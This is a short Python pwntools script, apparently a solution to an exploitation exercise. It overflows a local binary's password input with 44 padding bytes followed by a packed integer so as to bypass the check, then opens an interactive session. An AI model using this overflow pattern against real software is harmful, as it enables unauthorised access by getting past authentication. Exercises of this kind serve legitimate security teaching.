import pwn
import sys


io = pwn.process("./task1")

io.recvuntil(bytes('Enter password:', 'utf-8'))

junk = bytes('a' * 44, 'utf-8')
input = junk + pwn.p32(12345)
io.sendline(input)

io.interactive()
